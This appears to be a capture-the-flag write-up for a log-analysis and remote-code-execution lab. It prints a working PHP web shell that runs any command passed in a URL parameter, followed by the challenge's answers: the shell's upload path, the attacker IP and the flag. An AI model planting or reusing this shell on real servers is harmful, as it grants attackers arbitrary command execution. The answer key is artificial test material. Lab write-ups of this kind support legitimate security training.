# Day 3[Log Analysis] : Even if I wanted to go, their vulnerabilities wouldn't allow it.

## Learning objectives:
- Learn about Log analysis and tools like ELK stack.
- Learn about KQL and how it can be used to query logs.
- Learn about RCE

## Abbreviations:
- ELK Stack: Elasticsearch, Logstash, Kibana
- KQL: Kusto Query Language
- RCE: Remote Code Execution

## Learning resources:
- [ELK Stack](https://www.elastic.co/what-is/elk-stack)
- [KQL](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/)
- [RCE](https://en.wikipedia.org/wiki/Remote_code_execution)

## Learning materials:
- [Log Analysis](https://github.com/Cyber-Glitch/Wareville/blob/main/Day03_LogAnalysis.md)

> Remote Code Execution:
```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```

## QUESTIONS AND HINTS : 
1. **BLUE:** Where was the web shell uploaded to? (Answer format: /directory/directory/directory/filename.php)
   - Ans : `/media/images/rooms/shell.php`
2. **BLUE:** What IP address accessed the web shell?
   - Ans : `10.11.83.34`
3. **RED:** What is the contents of the flag.txt?
   - ![ls](/Screenshots/D3Q3a.png)
   - ![flag](/Screenshots/D3Q3.png)
   - Ans : `THM{Gl1tch_Was_H3r3}`